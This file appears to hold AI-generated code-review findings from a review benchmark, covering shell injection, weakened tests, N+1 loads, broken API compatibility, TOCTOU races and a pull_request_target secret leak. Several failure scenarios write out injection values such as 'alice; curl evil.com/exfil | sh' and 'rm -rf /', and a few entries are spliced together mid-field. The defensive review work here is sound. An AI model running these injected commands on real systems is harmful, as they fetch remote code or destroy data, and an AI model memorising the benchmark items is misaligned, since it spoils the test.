findings.body: Switching from a list argument to a shell-expanded string with shell=True allows the caller to inject arbitrary shell commands via user_name. Any shell metacharacters in user_name (e.g. `;`, `|`, `&`, backticks) are interpreted by the shell, so a value like `alice; rm -rf /` runs as a separate command. This is a classic OS command injection vulnerability.
findings.failure_scenario: An attacker passes user_name="alice; curl http://evil.com | sh". subprocess.run executes `report --user alice` and then runs the injected `curl ... | sh` under the process's privileges.
findings.title: Use argument list, not shell=True, to avoid command injection

findings.body: The function previously returned rows unchanged. The new code returns rows[1:], dropping the first element. The commit message says "preserve report behavior," so this is a contradiction of the stated intent. It also changes the observable contract for every caller and returns an empty list when rows has zero or one element.
findings.failure_scenario: A caller expecting render_report to return all rows instead receives rows without the first element; reports lose their header row or first data record on every invocation.
findings.title: Return rows unchanged to match the stated intent

findings.body: The new test only asserts the result is not None, which passes regardless of the off-by-one slice or any other regression. The previous test asserted the full rows were preserved, directly matching the "preserve report behavior" intent. Replacing a precise behavioral assertion with a tautological one removes the test's ability to catch the regression introduced in this same diff.
findings.failure_scenario: render_report returns rows[1:] (dropping the first row), but the test still passes because the result is not None; the regression ships undetected.
findings.title: Restore the behavioral assertion that rows are preserved

findings.body: The new code builds a shell command string from `user_name` and runs it with `shell=True`. A caller-controlled value is interpolated directly into the shell command, so any shell metacharacters in `user_name` (e.g. `;`, `|`, `$(...)`) are interpreted by the shell. The previous code passed arguments as a list, which avoided a shell entirely. This is a command-injection weakness introduced by the diff.
findings.failure_scenario: A caller passes user_name = "alice; rm -rf /". subprocess.run executes `report --user alice; rm -rf /` via the shell, running the second command after the first.
findings.title: Use argument list instead of shell=True to prevent command injection

findings.body: The test was renamed and weakened from an equality assertion on the returned list to a trivial `is not None` check. This no longer verifies that rows are preserved (or that the first row is intentionally dropped), so the regression introduced by rows[1:] goes undetected. A test that only asserts a non-None return provides almost no coverage of the function's contract.
findings.failure_scenario: render_report drops the first row or returns the wrong subset; the test still passes because the return value is merely not None, allowing the data-loss bug to ship.
findings.title: Assert the returned rows rather than only checking non-None

findings.body: The old code produced a timezone-aware datetime via `datetime.now(UTC)`. The replacement `datetime.utcnow()` returns a naive datetime and is deprecated since Python 3.12. Downstream code comparing or serializing this value against aware datetimes will raise TypeError or silently produce wrong offsets. Restore the `UTC` import (change line 1 back to `from datetime import UTC, datetime`) and call `datetime.now(UTC)`.
findings.failure_scenario: A consumer compares `fetched_at` against a timezone-aware timestamp (e.g. from a database) and raises `TypeError: can't compare offset-naive and offset-aware datetimes`, or logs/serializes the value without timezone context, producing ambiguous timestamps.
findings.title: Use timezone-aware UTC instead of deprecated datetime.utcnow()

findings.body: The commit claims to keep fetch_user backward compatible, but the new signature removes the `timeout=30` default and changes the return type from `dict[str, object]` to `tuple[dict[str, object], int]`. Existing callers that omit `timeout` will raise TypeError, and callers that use the result as a dict will break. This directly contradicts the stated intent.

A caller that did `result["id"]` now receives an int (the timeout) or raises TypeError because the result is a tuple, not a dict.

findings.body: The change builds a shell command string by interpolating `userName` directly into `report --user ${userName}` and passes it to `execSync`, which spawns a shell. Unlike the previous `spawnSync` with an argument array, this is vulnerable to command injection: any `userName` containing shell metacharacters (e.g. `alice; rm -rf /`) will be executed by the shell. Even if callers are trusted today, this is a significant security regression.
findings.failure_scenario: A caller passes a userName containing shell metacharacters such as `alice; touch pwned`. `execSync` runs the string through a shell, so the second command executes, allowing arbitrary command execution under the process's privileges.
findings.title: Command injection via unescaped userName in shell command

findings.body: The assertion was weakened from `toEqual(["first", "second"])` to `toBeDefined()` at the same time the implementation changed to return `rows.slice(1)`. The test no longer verifies what `renderReport` returns, so the new slice behavior — dropping the first row — is completely untested. The test name was also changed to "returns report rows", which is misleading now that the first row is discarded.
findings.title: Restore a meaningful assertion for renderReport's return value

findings.body: The stated intent is to "preserve report behavior," but the return value changed from rows to rows.slice(1), which drops the first row. This is a behavior change that contradicts the intent and will alter the output for any caller expecting the full list.
findings.failure_scenario: A caller that previously received ["first", "second"] now receives ["second"], silently dropping the first row from the report output.
findings.title: Return rows unchanged to preserve report behavior

findings.body: execSync runs the command through a shell, which is exactly the shell interpretation the spec forbids. The previous spawnSync form passed arguments as an array without a shell. Interpolating userName directly into the command string also opens command injection: a userName containing shell metacharacters (e.g. "; rm -rf /") would be executed by the shell.
findings.failure_scenario: A caller passes userName = "alice; echo pwned"; execSync invokes the shell, which runs both `report --user alice` and `echo pwned`, violating the no-shell-interpretation requirement and allowing arbitrary command execution.
findings.title: execSync reintroduces shell interpretation and command injection

findings.body: The loop awaits repo.load sequentially for every id. The previous implementation (repo.loadMany) could batch or parallelize the fetches. This change turns N independent lookups into N serial round-trips, increasing latency linearly with the input size and degrading throughput for large id lists.
findings.failure_scenario: A caller passes 500 ids. Each repo.load incurs ~20ms of network latency, so the loop takes ~10s instead of the ~20ms a batched loadMany would take, causing request timeouts under normal load.
findings.title: Fetch items concurrently to avoid serial round-trips

findings.body: The old code used `repo.loadMany(ids)`, which presumably batches the fetch into a single query. The new code loops over `ids` and calls `await repo.load(id)` per iteration, turning one batched query into N round-trips. The cost scales linearly with the length of `ids`, and on a hot path or large input list this adds significant latency and load.
findings.failure_scenario: A caller passes a large list of ids; instead of one database round-trip the function issues one per id, increasing wall-clock latency and exhausting the connection pool under concurrent load.
findings.title: Batch the per-id loads to avoid an N+1 query

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: toGMTString() is a deprecated legacy alias for toUTCString(). The previous implementation used toISOString(), which is the modern standard and produces a lexicographically sortable ISO 8601 timestamp. Switching to toGMTString() both uses a deprecated API and changes the output format (e.g. "01 Jan 2024 00:00:00 GMT" vs "2024-01-01T00:00:00.000Z"), which can break callers that parse or sort the fetchedAt value.
findings.failure_scenario: A consumer of fetchUser parses fetchedAt with new Date(value) or sorts records by fetchedAt expecting ISO 8601 format; the new toGMTString() output has a different format, causing parse failures or incorrect sort ordering.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];
findings.title: Replace deprecated toGMTString() with toISOString()

findings.anchor: export function fetchUser(id: string, timeoutMs: number): [Record<string, unknown>, number] {
findings.body: The commit message states 'retain fetchUser compatibility', but this change is a breaking API modification: the parameter `timeoutMs` loses its default value (callers must now pass it explicitly), the return type changes from `Record<string, unknown>` to a tuple `[Record<string, unknown>, number]`, and the returned object drops the `timeoutMs` field. Every existing caller of `fetchUser` that reads `timeoutMs` off the returned object, or that omits the second argument, will break.
findings.failure_scenario: An existing caller invokes fetchUser(id) expecting the default timeout and reads result.timeoutMs; under the new signature the call is a compile error (missing required arg) and result.timeoutMs is undefined, contradicting the 'retain compatibility' intent.
findings.title: Signature change breaks compatibility despite 'retain compatibility' intent

findings.body: Normalizing with toLowerCase() changes the value sent to the database. If user IDs are stored with their original case and the database uses case-sensitive comparison, this causes findUser to return no results for valid IDs that contain uppercase characters. This is safe only if IDs are case-insensitive (e.g., emails or UUIDs) or already stored in lowercase. Verify the database collation and ID format before applying this normalization.

findings.title: Lowercasing userId may break case-sensitive ID lookups

findings.body: execSync runs the command through a shell, and userName is interpolated unquoted into the command string. A userName containing shell metacharacters (e.g. `alice; rm -rf /`) executes arbitrary commands with the process's privileges. The previous spawnSync("report", ["--user", userName]) passed arguments without shell interpretation and was safe. To fix, revert the import on line 1 to `import { spawnSync } from "node:child_process"` and call `spawnSync("report", ["--user", userName])` instead of building and execSync-ing a string.
findings.failure_scenario: A caller passes a userName containing shell metacharacters such as `alice; rm -rf /`; execSync interprets the semicolon and executes the injected command after `report --user alice`.
findings.title: Revert to spawnSync array args to prevent shell injection via userName

findings.body: The commit message says 'keep report output stable for named users,' but rows.slice(1) removes the first element of the rows array, changing the output. The previous code returned rows unchanged. This contradicts the stated intent and silently drops data.
findings.failure_scenario: A caller passes ['header', 'row1', 'row2'] expecting the full array back; rows.slice(1) returns ['row1', 'row2'], silently losing the first row.
findings.title: Return rows unchanged instead of rows.slice(1) to match stable-output intent

findings.body: The assertion was downgraded from `toEqual(["first", "second"])` to `toBeTruthy()`, so the test no longer verifies what `renderReport` returns. The function now drops the first row via `rows.slice(1)`, a behavioral change this test should pin down. Any truthy value passes — `["second"]`, `["first", "second"]`, or even a non-array — so a regression in the slicing logic would ship silently.
findings.title: Strengthen weakened assertion to verify returned rows

findings.body: execSync passes its argument through the system shell, so any shell metacharacters in userName are interpreted as shell commands. The original spawnSync was safe because it passed arguments as an array without shell interpretation. Replace execSync with execFileSync (or revert to spawnSync) and pass arguments as an array. The import on line 1 must also change to `import { execFileSync } from "node:child_process";`, and the `const command` template-string line should be removed.
findings.failure_scenario: A caller passes userName = '; rm -rf /' (or any value containing shell metacharacters). execSync invokes the shell, which executes the injected command after report, leading to arbitrary command execution with the process's privileges.
findings.title: Use execFileSync to avoid shell injection via userName

findings.body: repository.load(id) can return null or undefined when an id has no corresponding record. The code immediately accesses item.active without checking that item exists, so a single missing id throws a TypeError and aborts the entire enrichment, discarding all previously accumulated results.
findings.failure_scenario: ids contains one id that does not map to a stored record; repository.load returns undefined; evaluating item.active throws TypeError; the function rejects and all valid items collected so far are lost.
findings.title: Guard against null/undefined item before accessing item.active

findings.body: The previous implementation called repository.loadMany(ids) once to fetch all items. The new loop issues one repository.load(id) per id, turning a single batched call into N sequential round-trips. The cost scales linearly with the number of ids and adds N awaited calls on a path that was previously one.
findings.failure_scenario: When ids contains many entries, enrich issues one repository.load call per id sequentially, multiplying latency by N and increasing load on the repository or connection pool.
findings.suggestion:
const items = await repository.loadMany(ids);
  return items.filter(item => item.active && item.owner && item.owner.enabled);
findings.title: Batch the repository loads instead of loading per id

findings.body: The old code safely passed `user` as a separate argument via `Command::new("report").args(["--user", user])`, which prevents any shell interpretation. The new code interpolates `user` directly into a command string with `format!("report --user {user}")` and executes it through `sh -c`, so any shell metacharacters in `user` are interpreted by the shell. findings.title: Batch the per-id loads instead of calling repo.load in a loop

findings.body: VecFactory::create() is a single-caller abstraction whose entire body is Vec::new(). It adds a struct, an impl block, and an indirection for no behaviour the standard library does not already provide directly.
findings.title: Remove VecFactory; it only wraps Vec::new()

findings.body: The original implementation called repo.load_many(ids), which loaded all requested ids in one batch. The new code loops and calls repo.load(*id) per id, then filters to active items with an enabled owner. This changes behavior: items that are inactive or whose owner is disabled/absent are now excluded, whereas load_many presumably returned all requested items. Unless the intent is to add filtering, this contradicts the original behavior and the commit message 'plant rust-efficiency-design-v1' suggests an efficiency/design change, not a filtering change.
findings.failure_scenario: Callers of enrich expecting all ids to be returned now receive a filtered subset; inactive items or items with disabled/absent owners are silently dropped, causing missing data downstream.
findings.title: Restore batch loading via load_many to preserve original semantics

findings.body: The active check, the owner Option match, and the enabled check are nested three levels deep inside the loop body. Inverting the conditions as early continues would keep the happy path at one indentation level and make the filtering intent easier to read.

findings.body: `std::mem::uninitialized()` is deprecated since Rust 1.39 because producing an invalid value of a type like `UserRecord` (which almost certainly contains `String`, `Vec`, or other non-zero-validity types) is immediate undefined behavior. The `scratch` value is then passed into `UserRecord::merge`, which may read or drop fields of the uninitialized memory, corrupting state or crashing. The fix is structural: `merge` must be rewritten to accept `MaybeUninit<UserRecord>` or the scratch value must be constructed properly before merging.
findings.failure_scenario: `UserRecord::merge` reads or drops a field of `scratch` (e.g. a `String` whose pointer/len/capacity are garbage). Dropping it calls the allocator with an invalid pointer, causing a crash or memory corruption.
findings.title: Replace std::mem::uninitialized with MaybeUninit to avoid undefined behavior

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message says "keep fetch_user source compatible," but the parameter type changed from `Option<u64>` to `u64` and the return type changed from `UserRecord` to `(UserRecord, u64)`. Every existing call site that passes `Some(ms)`/`None` or destructures a single `UserRecord` will fail to compile. This is the opposite of source compatibility.
findings.failure_scenario: A caller written against the old API does `let u: UserRecord = fetch_user(id, None);`. After this change it fails to compile because `None` is not a `u64` and the return is a tuple, not a `UserRecord`.
findings.title: Signature change breaks source compatibility promised by the commit

findings.body: The function returns `timeout_ms` as the second tuple element, but the caller already holds this value — it was just passed in. Returning it adds API surface with no information gain and forces every caller to destructure a value it already has.
findings.title: Don't return the input timeout_ms unchanged

findings.body: Calling canonicalize() on root.join(name) resolves symlinks in the path. If `name` contains a symlink that points outside `root`, canonicalize() follows it to the real target, and strip_prefix(&root) then correctly rejects it. However, if the intent is to allow legitimate symlinks that point within the root tree, canonicalize() collapses them, which may be acceptable. The real issue: canonicalize() requires the path to exist; if the file does not exist yet (e.g., opening for a report that hasn't been created), this returns an error rather than a PermissionDenied. More critically, the TOCTOU window remains: between canonicalize() and File::open(), a symlink could be created, allowing traversal.
findings.failure_scenario: An attacker places a symlink inside root pointing to /etc/passwd after the canonicalize check but before File::open, causing File::open to follow the symlink and read a file outside root.
findings.title: Canonicalizing the candidate resolves symlinks before the containment check

findings.body: The path is canonicalized and checked for containment, then separately opened. Between these two steps a symlink can be created or replaced, so File::open may follow a different path than the one that was validated. This is a classic time-of-check/time-of-use race that can defeat the path-traversal protection the change intends to add.
findings.failure_scenario: An attacker creates or swaps a symlink at the candidate path after canonicalize() but before File::open(), so the opened file resolves outside root even though the check passed.
findings.title: TOCTOU race between canonicalize and File::open

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. A `user` value containing shell metacharacters (e.g. `; rm -rf /` or `$(malicious)`) will be executed as a separate command. The previous code used `Process.run('report', ['--user', user])` which passed `user` as a single argv element, avoiding shell interpretation entirely. Remove the `final command` line and revert to the argv-based call.
findings.failure_scenario: A caller passes `user = "alice; curl evil.com/exfil | sh"`; `sh -c` interprets the semicolon and runs the second command, leading to arbitrary code execution.
findings.title: Sanitize user input before shell interpolation

findings.body: The function now returns `rows.sublist(1)`, unconditionally discarding the first row. For an empty list, `sublist(1)` throws a `RangeError`; for a single-element list it returns an empty list, changing the contract from preserving rows to silently dropping data. The test was weakened to only assert non-null, so this regression is not caught.
findings.failure_scenario: A caller invokes `renderReport(user, [])`; `rows.sublist(1)` throws `RangeError`, causing the report rendering flow to fail at runtime.
findings.title: Do not drop the first row without validation

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The assertion was weakened from checking the exact return value `['first', 'second']` to `isNotNull`, which verifies nothing about the content. The implementation now returns `rows.sublist(1)`, dropping the first row — a behavior change this test cannot detect. If dropping the first row is intentional, assert `['second']`; if not, fix the implementation and assert `['first', 'second']`.
findings.suggestion: test('drops first row', () async => expect(await renderReport('alice', ['first', 'second']), ['second']));
findings.title: Restore meaningful assertion on returned rows

findings.body: The spec requires report commands to pass user names as arguments without a shell. The new code builds a shell command string by interpolating `user` and runs it via `sh -c`, which both contradicts that requirement and introduces a command-injection vector: a `user` value containing shell metacharacters (e.g. `alice; rm -rf /`) is executed by the shell.
findings.failure_scenario: A caller passes a user string containing shell metacharacters such as `alice; touch /tmp/pwned`. The value is interpolated into `command` and passed to `sh -c`, which executes the injected command with the process's privileges.
findings.title: Run the report command without a shell, passing user as an argument

findings.body: The previous implementation called repository.loadMany(ids) to fetch all items in a single round-trip. The new loop awaits repository.load(id) once per id, turning one batched query into N sequential queries. Latency and connection-pool pressure scale linearly with the length of ids, and because each await is sequential there is no concurrency overlap.
findings.failure_scenario: When ids contains hundreds or thousands of entries, the function issues one database/network round-trip per id, multiplying latency by N and risking connection-pool exhaustion under concurrent callers.
findings.title: Batch the per-id loads instead of issuing one query per iteration

findings.body: The original enrich returned every item from loadMany without filtering. The new version only adds items where item.active is true, item.owner is non-null, and item.owner!.enabled is true. Any caller that relied on enrich returning the full set of loaded items now silently receives a subset. If this filtering is intentional, the function's contract and callers should be updated; if not, it is a regression that drops valid items without error.

findings.body: The new implementation replaces the previous batched `repository.loadMany(ids)` with a per-id `repository.load(id)` inside the loop, issuing one repository round-trip per element. The cost scales linearly with the size of `ids`, and on a hot path this turns a single query into N queries, increasing latency and pressure on the repository/connection pool. Load all items in one call and filter the result in memory.
findings.failure_scenario: A caller passes a large ids list (e.g. 10k entries); enrich issues 10k repository.load calls instead of one loadMany, multiplying latency and exhausting the connection pool under concurrent load.
findings.title: Batch the per-id repository loads to avoid N+1 queries

findings.body: The commit message says 'preserve UserClient caller compatibility,' but the return type changed from `User` to `Map.Entry<User, Integer>` and the second parameter changed from `Integer` (nullable, defaulting to 30000) to `int`. Existing callers that assign the result to `User` or pass `null` for the timeout will no longer compile, and the 30000 ms default is removed.
findings.failure_scenario: A caller doing `User u = client.fetch(id, null)` fails to compile because the return type is now Map.Entry<User, Integer> and null cannot unbox to int.
findings.title: fetch signature change breaks caller compatibility

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The PreparedStatement created on this line is never closed. The method returns the ResultSet but leaves the statement open; closing only the ResultSet does not close the statement. Over repeated calls this leaks database cursors and statement handles, which can exhaust the connection pool. Because the ResultSet is returned to the caller, a try-with-resources here would close the ResultSet prematurely — the fix is structural: either have the caller manage the statement lifecycle, or process results inside this method instead of returning the ResultSet.
findings.failure_scenario: Repeated calls to find() create PreparedStatements that are never closed; each holds server-side resources until the connection itself is closed, eventually exhausting the statement cursor pool or connection pool under load.
findings.title: Close the PreparedStatement to avoid resource leak

findings.body: userId.trim() throws NullPointerException when userId is null. The previous implementation ignored userId entirely, so this is a new failure mode introduced by the change. If any caller can pass null, the method crashes with an unhandled NPE instead of returning an empty result or a meaningful error.
findings.failure_scenario: A caller passes null for userId; userId.trim() throws NullPointerException, propagating an unhandled NPE instead of a controlled empty or error response.

if (userId == null) throw new IllegalArgumentException("userId must not be null");
    statement.setString(1, userId.trim().toLowerCase());

findings.body: Building a shell command by concatenating `user` into a `sh -c` string lets a caller-controlled value break out of the intended argument and run arbitrary commands. The previous form passed `user` as a discrete argv element, which the exec layer never interprets as shell syntax. This is a security regression introduced by the change.
findings.failure_scenario: A caller passes user=`alice; rm -rf /tmp/x` (or any value containing shell metacharacters). `sh -c` parses the whole string, so `rm -rf /tmp/x` executes as a separate command with the process's privileges.
findings.title: Pass user as an argument, not via sh -c string concatenation

findings.body: The function previously returned `rows` unchanged. It now returns `rows[1:]`, discarding the first element of the caller's slice. For any non-empty input this loses data; for an empty slice it returns an empty slice rather than signaling an error. There is no indication this is intentional, and the renamed/weakened test no longer catches it.
findings.failure_scenario: A caller passes `[]string{"header", "a", "b"}` expecting all three rows back. Render returns `[]string{"a", "b"}`, silently dropping the first row and corrupting downstream output.
findings.title: Returning rows[1:] silently drops the first row of data

findings.body: The commit message says "preserve FetchUser caller compatibility," but the signature changed from `FetchUser(id string, timeout *time.Duration) User` to `FetchUser(id string, timeout time.Duration) (User, time.Duration)`. The parameter type changed from `*time.Duration` to `time.Duration` and the return type changed from a single `User` to a `(User, time.Duration)` tuple. Every existing call site that passes a pointer or assigns the single return value will fail to compile. If compatibility is the actual goal, the signature should be restored; if the signature change is intentional, the commit message is misleading.
findings.failure_scenario: Existing callers passing a *time.Duration or assigning the single User return get compile errors, contradicting the stated compatibility preservation goal.

findings.body: `ioutil.ReadFile("defaults.json")` reads a file from the working directory and immediately discards both the byte slice and the error with `_, _ =`. This is dead code that adds a hidden filesystem dependency and I/O cost on every call for no effect. If defaults are needed, the result should be used and the error handled; if not, the call and the `io/ioutil` import should be removed.
findings.failure_scenario: At runtime the function performs an unnecessary disk read on every call; if defaults.json is missing the error is silently swallowed, masking a potential configuration problem.

findings.body: Switching the trigger to `pull_request_target` makes the workflow run with the base repository's secrets and permissions, while `ref: ${{ github.event.pull_request.head.sha }}` checks out the fork's PR code and `npm test` executes it. `RELEASE_TOKEN` is injected into that untrusted execution environment. A malicious PR can modify package.json scripts, test files, or any code `npm test` loads to read `RELEASE_TOKEN` and exfiltrate it (e.g. via an HTTP request in a test). This is the canonical `pull_request_target` privilege-escalation pattern.
findings.failure_scenario: An attacker opens a PR that adds `process.env.RELEASE_TOKEN` exfiltration inside a test or npm lifecycle script. The workflow triggers on `pull_request_target`, checks out the attacker's commit, runs `npm test` with `RELEASE_TOKEN` in the environment, and the secret is sent to an attacker-controlled endpoint.
findings.title: pull_request_target runs untrusted PR code with repository secrets

findings.body: The workflow switched from `pull_request` to `pull_request_target`, which runs in the base repository context with access to repository secrets. It then checks out the PR author's head SHA (`github.event.pull_request.head.sha`) and runs `npm test` — arbitrary code from an untrusted contributor — with `RELEASE_TOKEN` injected into the environment. Any user who can open a pull request can modify `package.json`/test scripts to exfiltrate `RELEASE_TOKEN` (e.g., by sending it to an external endpoint). This is the canonical GitHub Actions `pull_request_target` secret-exfiltration anti-pattern.
findings.failure_scenario: A malicious user opens a PR that modifies the test script (e.g., in package.json) to send process.env.RELEASE_TOKEN to an attacker-controlled server. Because pull_request_target runs with base-branch secrets and the workflow checks out the PR's own code, npm test executes the modified script with RELEASE_TOKEN available, leaking the token to the attacker.
findings.title: Remove RELEASE_TOKEN from untrusted PR code execution context

findings.body: `datetime.utcnow()` is deprecated since Python 3.12 and returns a naive datetime. The previous code used `datetime.now(UTC)`, producing a timezone-aware value. This change silently downgrades `fetched_at` from aware to naive, which can break callers that compare or serialize it against timezone-aware timestamps. Add `timezone` (or `UTC` on Python 3.11+) back to the `datetime` import and use `datetime.now(timezone.utc)`.
findings.failure_scenario: A caller compares `fetched_at` against a timezone-aware datetime (e.g. from `datetime.now(timezone.utc)`), which raises `TypeError: can't compare offset-naive and offset-aware datetimes`.
findings.title: Restore timezone-aware datetime instead of deprecated utcnow()

findings.body: The stated intent is to keep fetch_user backward compatible, but the signature changes the return type from dict to tuple, removes the default value for timeout, and drops the fetched_at/timeout keys from the returned dict. Callers expecting a dict payload and a default timeout will break.
findings.failure_scenario: Existing callers invoking fetch_user(user_id) without a timeout now get a TypeError, and callers accessing result['fetched_at'] get a tuple-indexing error because the function now returns a tuple.
findings.title: Return type and shape break backward compatibility

findings.body: `PurePath` resolves path separators according to the host OS. On Windows, backslashes are treated as separators, so a user_id like `a\b` normalizes to `b`; on POSIX the same string is returned whole. A database query should not depend on the OS running the application code. Use `PurePosixPath` for deterministic behavior, or validate the user_id against an allowlist pattern instead of repurposing path logic.
findings.failure_scenario: Application runs on Windows in one environment and Linux in another. A user_id containing a backslash normalizes differently on each, so the same input resolves to different rows (or no row) depending on deployment, producing inconsistent lookup results.
findings.title: Use PurePosixPath for deterministic user_id normalization

findings.body: The commit message says "retain fetchUser compatibility," but this line makes `timeoutMs` required by removing its `= 30_000` default and changes the return type from `Record<string, unknown>` to a tuple `[Record<string, unknown>, number]`. Both are breaking changes for existing callers: any call site relying on `fetchUser(id)` now fails to type-check, and any consumer of the returned object (e.g. `result.timeoutMs` or `result.fetchedAt`) now sees a different shape. The returned object also drops the `timeoutMs` field entirely, so callers reading it from the object get `undefined`.

findings.body: The previous implementation called repository.loadMany(ids) once; the new loop issues one repository.load(id) per id, turning a single round-trip into N. The cost scales linearly with the input size and regresses the prior batched behaviour.
findings.failure_scenario: When ids contains many entries, enrich makes one repository call per id instead of one batched call, multiplying latency and connection usage and potentially exhausting the connection pool under load.

findings.title: New filtering by active/owner/enabled is unexplained by the stated intent

findings.body: Interpolating `user` into a shell command string and running it via `sh -c` lets any shell metacharacter in `user` execute arbitrary commands. The previous code passed `user` as a discrete argument with `args(["--user", user])`, which the OS exec layer treats as a single literal value with no shell parsing. The new path routes through a shell, so a `user` value like `alice; rm -rf /` or `alice$(curl evil)` is interpreted by `sh`.
findings.failure_scenario: A caller passes a user value containing shell metacharacters (e.g. `alice; curl attacker.com | sh`). `sh -c` parses and executes the injected command with the process's privileges, leading to arbitrary remote code execution.
findings.title: Restore direct argument passing to fix shell injection

findings.body: Interpolating `user` into a string executed by `sh -c` lets a caller-controlled username inject arbitrary shell commands (e.g. `alice; rm -rf /`). The previous code used `args(["--user", user])`, which passes `user` as a single argv element and is not interpreted by a shell. The `format!` line above should also be removed once this line is reverted.
findings.failure_scenario: A user value containing shell metacharacters such as `"; rm -rf /"` is interpolated into the command string and executed by sh -c, running arbitrary commands with the process's privileges.
findings.title: Pass user as an argv element, not through a shell string

findings.body: The original code used repo.load_many(ids) to batch-load all items in a single call. The replacement issues one repo.load(*id) call per id, creating an N+1 query pattern. For a slice of N ids this turns one batch operation into N individual operations, with latency and backend load scaling linearly with input size. If repo.load also panics or returns a default for non-existent ids (its signature returns Item, not Option<Item>), the per-id path may handle missing ids differently than load_many did.
findings.failure_scenario: A caller passes 10 000 ids to enrich. Instead of one batch load, the function issues 10 000 individual load calls, increasing wall-clock latency and database/repository pressure by orders of magnitude.
findings.title: Batch-load items instead of calling repo.load per id

findings.title: enrich silently drops inactive, ownerless, or disabled-owner items

findings.body: The previous implementation used `repo.load_many(ids)` to fetch all items in one batched call. findings.body: `std::mem::uninitialized()` produces a value of `UserRecord` whose memory is entirely uninitialized. Reading or dropping such a value is undefined behavior for any type containing non-`Copy` fields (e.g., `String`, `Vec`, `Box`). Passing `scratch` into `UserRecord::merge` almost certainly reads its fields, and even constructing it this way is already UB. The function is also deprecated since Rust 1.39 in favor of `MaybeUninit`, precisely because it is unsound. The previous implementation constructed a valid `UserRecord` via `UserRecord::new`; this rewrite trades that for a dangling/uninitialized record.
findings.failure_scenario: A caller invokes fetch_user. The uninitialized UserRecord is passed to UserRecord::merge, which reads a pointer/String field containing garbage bytes, producing a crash, data corruption, or exploitable memory unsafety depending on the field layout.
findings.title: Do not use std::mem::uninitialized() to create a UserRecord

findings.body: The path is validated with canonicalize() + strip_prefix(), then reopened with File::open(). Between the check and the open the filesystem can change: an attacker who can write inside root can replace the validated file with a symlink pointing outside root (e.g. /etc/passwd), and File::open() will follow it, bypassing the traversal guard. This is the classic check-then-open TOCTOU pattern. Use openat-style relative opening (e.g. open root as a dir, then openat with RESOLVE_BENEATH / O_NOFOLLOW on the leaf) or open the file first and validate the canonicalized fd path afterward.
findings.failure_scenario: An attacker with write access inside root swaps report.txt for a symlink to /etc/passwd after canonicalize() validates it but before File::open() runs; File::open follows the symlink and returns /etc/passwd's contents.
findings.title: Path traversal check is TOCTOU-racy against symlink swap

findings.body: Interpolating `user` into a shell command string and executing it via `sh -c` allows command injection. The previous code passed `user` as a separate element in the argument list, which the OS delivers verbatim without shell interpretation. Any shell metacharacter in `user` (`;`, `&&`, `$()`, backticks, etc.) is now interpreted by `sh`.
findings.failure_scenario: A caller passes a user value containing shell metacharacters, e.g. `alice; rm -rf /`. `sh -c` interprets the semicolon as a command separator and executes `rm -rf /` on the host with the process's privileges.
findings.title: Pass user as an argument list, not through sh -c

findings.body: `rows.sublist(1)` returns elements from index 1 onward, discarding the first row. The stated intent is to "preserve report rows for named users," but this change loses the first element of every input. The previous code returned `rows` unchanged. Additionally, when `rows` is empty, `sublist(1)` throws a `RangeError`.
findings.failure_scenario: renderReport is called with `['first', 'second']` and returns `['second']`, silently dropping the first row. Any caller expecting all rows receives incomplete data. With an empty list it crashes with RangeError.
findings.title: Return all rows instead of dropping the first with sublist(1)

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The assertion was weakened from checking exact content `['first', 'second']` to merely `isNotNull`, and the test name changed from 'preserves rows' to 'returns rows'. This no longer verifies that rows are preserved, which is the stated intent. The weakened assertion hides the `sublist(1)` regression because any non-null return value passes.
findings.failure_scenario: renderReport drops the first row or returns an unrelated non-null list; the test still passes, masking the data-loss regression.
findings.title: Restore the assertion that rows are preserved exactly

findings.body: Invoking `sh -c` with an interpolated string is the shell-based execution the spec forbids. Even setting injection aside, this changes the process model from a direct exec with an argument list to a shell interpretation layer, which can alter quoting and exit behaviour.
findings.failure_scenario: A user name containing spaces or quotes is split or reinterpreted by the shell, so `report` receives a different `--user` value than the caller intended, producing wrong or failed report runs.
findings.title: Run report via sh -c instead of invoking the binary directly

findings.body: The previous implementation called repository.loadMany(ids) once to fetch all items in a single batch; the new loop awaits repository.load(id) inside the loop, issuing one repository round-trip per id. The cost now scales linearly with the length of ids in terms of I/O calls, turning a single query into N queries.
findings.failure_scenario: When ids contains many entries, enrich issues one repository.load call per id, multiplying latency and connection usage by N and potentially exhausting the repository's connection pool under load.
findings.title: Batch repository loads instead of one query per id

findings.body: Three levels of nested if (active, owner != null, owner!.enabled) make the happy path hard to follow and push the real action deep into indentation. A single combined guard clause flattens this and keeps the add call at the loop body level.

findings.body: The original enrich returned every item from repository.loadMany(ids). The new code only returns items where item.active is true, item.owner is non-null, and item.owner!.enabled is true. Any caller that relied on receiving all items for the given IDs now receives a filtered subset, silently dropping inactive items and items with a disabled or absent owner. The commit message references "efficiency" and does not mention this filtering, so the behavior change is unexplained and may break downstream consumers.
findings.failure_scenario: A caller passes IDs that include inactive items expecting to receive them all. The filtered loop returns only active items with enabled owners, so the caller sees fewer items than requested and processes incomplete data.
findings.title: New filtering silently drops items the original enrich returned

findings.body: ResultListFactory is a class with a single static method that returns an empty <Item>[]. findings.title: Replace ResultListFactory with a direct list literal

findings.body: The commit message says "keep fetchUser callers compatible," but the new signature does the opposite. `timeoutMs` changed from an optional parameter with a default (`[int timeoutMs = 30000]`) to a required positional parameter, so every caller that relied on the default now fails to compile. The return type also changed from `Map<String, Object?>` to a record `(Map<String, Object?>, int)`, so every caller that uses the returned value breaks as well. Both changes directly contradict the stated intent.
findings.failure_scenario: A caller written as `fetchUser('123')` no longer compiles because `timeoutMs` is now required; a caller written as `var u = fetchUser('123', 5000); print(u['id'])` no longer compiles because `u` is now a record, not a Map.
findings.title: Signature change breaks existing fetchUser callers

